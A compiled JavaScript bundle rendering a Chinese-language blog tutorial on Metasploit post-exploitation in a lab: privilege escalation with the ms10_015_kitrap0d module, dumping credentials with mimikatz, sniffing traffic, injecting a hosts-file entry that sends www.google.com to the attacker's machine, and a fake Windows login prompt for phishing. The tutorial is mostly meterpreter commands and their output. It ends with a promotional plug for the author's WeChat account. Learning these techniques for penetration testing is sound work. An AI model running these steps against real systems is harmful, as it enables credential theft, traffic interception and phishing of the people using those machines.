(window.webpackJsonp=window.webpackJsonp||[]).push([[317],{608:function(s,a,e){"use strict";e.r(a);var t=e(7),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit高级扩展功能"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit高级扩展功能"}},[s._v("#")]),s._v(" Metasploit高级扩展功能")]),s._v(" "),a("h3",{attrs:{id:"用metasploit提升权限"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#用metasploit提升权限"}},[s._v("#")]),s._v(" 用Metasploit提升权限")]),s._v(" "),a("p",[s._v("有时，在使用getsystem提权的时候会失败，此时，我们可以使用后渗透模块将控制权限级别提高至最高级别。这里，我们以Windows Server 2008 SP1操作系统为例，其中，使用本地渗透模块绕过了限制并获得了目标的完全管理权限。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > back\nmsf5 > use exploit/windows/local/ms10_015_kitrap0d \nmsf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3\nmsf5 exploit(windows/local/ms10_015_kitrap0d) > exploit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("这里，我们使用 exploit/windows/local/ms10_015_kitrap0d 模块提升了控制权限，并获得了最高级别的管理权限。")]),s._v(" "),a("h3",{attrs:{id:"使用mimikatz查找明文密码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用mimikatz查找明文密码"}},[s._v("#")]),s._v(" 使用mimikatz查找明文密码")]),s._v(" "),a("p",[s._v("mimikatz可以直接从lsass服务获取Windows中状态为活跃的账号的明文密码。")]),s._v(" "),a("p",[s._v("可以在Metasploit中使用load mimikatz命令载入mimikatz模块，之后就可以使用mimikatz模块中的kerberos命令来查找密码。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > load mimikatz \nLoading extension mimikatz...Success.\nmeterpreter > kerberos \n[+] Running as SYSTEM\n[*] Retrieving kerberos credentials\nkerberos credentials\n====================\n\nAuthID   Package    Domain        User             Password\n------   -------    ------        ----             --------\n0;62769  NTLM       LIUYAZHUANG   lyz              \n0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE    \n0;996    Negotiate  NT AUTHORITY  NETWORK SERVICE  \n0;52356  NTLM                                      \n0;999    NTLM       WORKGROUP     LIUYAZHUANG$     \n\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("p",[s._v("这里，我删除了密码。")]),s._v(" "),a("h3",{attrs:{id:"使用metasploit进行流量嗅探"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit进行流量嗅探"}},[s._v("#")]),s._v(" 使用Metasploit进行流量嗅探")]),s._v(" "),a("h4",{attrs:{id:"使用sniffer模块"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用sniffer模块"}},[s._v("#")]),s._v(" 使用sniffer模块")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > use sniffer \nLoading extension sniffer...Success.\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h4",{attrs:{id:"列出目标主机上的所有网络接口"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#列出目标主机上的所有网络接口"}},[s._v("#")]),s._v(" 列出目标主机上的所有网络接口")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > sniffer_interfaces \n\n1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )\n\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h4",{attrs:{id:"启动网络嗅探"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#启动网络嗅探"}},[s._v("#")]),s._v(" 启动网络嗅探")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > sniffer_start\n[-] Usage: sniffer_start [interface-id] [packet-buffer (1-200000)] [bpf filter (posix meterpreter only)]\nmeterpreter > \nmeterpreter > sniffer_start 1 1000\n[*] Capture started on interface 1 (1000 packet buffer)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("输入sniffer_start 1 1000命令启动网络接口上的嗅探功能，其中1表示网卡ID,1000是缓冲区的大小。")]),s._v(" "),a("h4",{attrs:{id:"下载pcap数据包"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#下载pcap数据包"}},[s._v("#")]),s._v(" 下载pcap数据包")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > sniffer_dump \n[-] Usage: sniffer_dump [interface-id] [pcap-file]\nmeterpreter > sniffer_dump 1 1.pcap\n[*] Flushing packet capture buffer for interface 1...\n[*] Flushed 1000 packets (993284 bytes)\n[*] Downloaded 052% (524288/993284)...\n[*] Downloaded 100% (993284/993284)...\n[*] Download completed, converting to PCAP...\n[*] PCAP file written to 1.pcap\nmeterpreter >\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[s._v("此时，会把1.pcap下载到/root目录下(前提是用root账户登录的Kali)")]),s._v(" "),a("h4",{attrs:{id:"使用wireshark查看数据包"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用wireshark查看数据包"}},[s._v("#")]),s._v(" 使用wireshark查看数据包")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("root@binghe:~# wireshark 1.pcap \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127203707765.png",loading:"lazy"}})]),s._v(" "),a("h4",{attrs:{id:"停止网络嗅探"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#停止网络嗅探"}},[s._v("#")]),s._v(" 停止网络嗅探")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > sniffer_stop\n[-] Usage: sniffer_stop [interface-id]\nmeterpreter > \nmeterpreter > sniffer_stop 1\n[*] Capture stopped on interface 1\n[*] There are 74 packets (14485 bytes) remaining\n[*] Download or release them using 'sniffer_dump' or 'sniffer_release'\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h3",{attrs:{id:"使用metasploit对host文件进行注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit对host文件进行注入"}},[s._v("#")]),s._v(" 使用Metasploit对host文件进行注入")]),s._v(" "),a("p",[s._v("可以通过对目标主机的host文件进行注入展开钓鱼攻击——将制定域名的条目添加到目标主机的host文件中。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > background\n[*] Backgrounding session 2...\nmsf5 exploit(windows/http/rejetto_hfs_exec) > sessions -i\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                        Connection\n  --  ----  ----                     -----------                        ----------\n  2         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ LIUYAZHUANG  192.168.175.128:4444 -> 192.168.175.130:1056 (192.168.175.130)\n\nmsf5 exploit(windows/http/rejetto_hfs_exec) > use post/windows/manage/inject_host \nmsf5 post(windows/manage/inject_host) > show options\n\nModule options (post/windows/manage/inject_host):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   DOMAIN                    yes       Domain name for host file manipulation.\n   IP                        yes       IP address to point domain name to.\n   SESSION                   yes       The session to run this module on.\n\nmsf5 post(windows/manage/inject_host) > set IP 192.168.175.128\nIP => 192.168.175.128\nmsf5 post(windows/manage/inject_host) > set DOMAIN www.google.com\nDOMAIN => www.google.com\nmsf5 post(windows/manage/inject_host) > set SESSION 2\nSESSION => 2\nmsf5 post(windows/manage/inject_host) > exploit\n\n[*] Inserting hosts file entry pointing www.google.com to 192.168.175.128..\n[+] Done!\n[*] Post module execution completed\nmsf5 post(windows/manage/inject_host) > \nmsf5 post(windows/manage/inject_host) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                        Connection\n  --  ----  ----                     -----------                        ----------\n  2         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ LIUYAZHUANG  192.168.175.128:4444 -> 192.168.175.130:1056 (192.168.175.130)\n\nmsf5 post(windows/manage/inject_host) > \nmsf5 post(windows/manage/inject_host) > \nmsf5 post(windows/manage/inject_host) > sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br")])]),a("p",[s._v("此时，在目标机的C:/Windows/System32/drivers/etc/hosts文件中多了一行")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("192.168.175.128 www.google.com\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如下图所示：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127203850282.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("此时，在目标机上访问http://www.google.com/，结果如下图：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127203929154.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("访问的是我们在Kali上配置的页面。")]),s._v(" "),a("h3",{attrs:{id:"登录密码的钓鱼窗口"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#登录密码的钓鱼窗口"}},[s._v("#")]),s._v(" 登录密码的钓鱼窗口")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("meterpreter > run post/windows/gather/phish_windows_credentials \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("此时，会在目标主机上弹出外观和Windows系统认证弹窗一样的窗口，这个窗口要求受害者必须输入正确的用户名和密码后才能继续正常工作。")]),s._v(" "),a("p",[s._v("如下图所示：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127204015499.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("当用户输入了正确的用户名和密码之后，就会在我们的命令行中显示出来，如下图所示：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127204106537.png",loading:"lazy"}})]),s._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=n.exports}}]);